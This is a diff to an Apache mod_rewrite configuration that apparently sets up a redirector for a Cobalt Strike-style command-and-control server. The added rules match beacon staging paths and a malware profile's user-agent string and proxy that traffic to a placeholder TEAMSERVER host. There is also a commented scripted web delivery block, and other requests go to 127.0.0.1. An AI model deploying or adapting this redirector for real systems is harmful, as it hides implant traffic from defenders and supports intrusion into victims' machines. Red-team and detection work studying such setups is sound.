@@ -7,6 +7,9 @@
       	RewriteOptions Inherit
       	ServerSignature Off
 	
+	## Uncomment to enable verbose debugging in /var/logs/apache2/error.log
+	# LogLevel alert rewrite:trace5
+	
 	ErrorDocument 404 http://127.0.0.1/
 	ErrorDocument 500 http://127.0.0.1/
 	
@@ -55,3 +58,24 @@
 	#Whitelisted Cert Validation Services
         #RewriteCond %{HTTP_USER_AGENT} "COMODO DCV" [NC]
         #RewriteRule ^.*$ replaceme_Allowed [L]
+	
+	## Scripted Web Delivery 
+	## Uncomment and adjust as needed
+	#RewriteCond %{REQUEST_URI} ^/{URI GOES HERE}?$
+	#RewriteCond %{HTTP_USER_AGENT} ^$
+	#RewriteRule ^.*$ "http://TEAMSERVER%{REQUEST_URI}" [P,L]
+
+	## Default Beacon Staging Support (/1234)
+	RewriteCond %{REQUEST_URI} ^/..../?$
+	RewriteCond %{HTTP_USER_AGENT} "Mozilla/5.0 \(Windows; U; MSIE 7.0; Windows NT 5.2\) Java/1.5.0_08"
+	RewriteRule ^.*$ "http://TEAMSERVER%{REQUEST_URI}" [P,L]
+
+	## C2 Traffic (HTTP-GET, HTTP-POST, HTTP-STAGER URIs)
+	## Logic: If a requested URI AND the User-Agent matches, proxy the connection to the Teamserver
+	## Consider adding other HTTP checks to fine tune the check.  (HTTP Cookie, HTTP Referer, HTTP Query String, etc)
+	## Refer to http://httpd.apache.org/docs/current/mod/mod_rewrite.html
+	## Profile URIs
+	RewriteCond %{REQUEST_URI} ^(/{URI GOES HERE}.*|/{AND OTHER URI GOES HERE}.*|/{AND OTHER URI GOES HERE}.*)$
+	## Profile UserAgent
+	RewriteCond %{HTTP_USER_AGENT} "Mozilla/5.0 \(Windows; U; MSIE 7.0; Windows NT 5.2\) Java/1.5.0_08"
+	RewriteRule ^.*$ "https://TEAMSERVER%{REQUEST_URI}" [P,L]
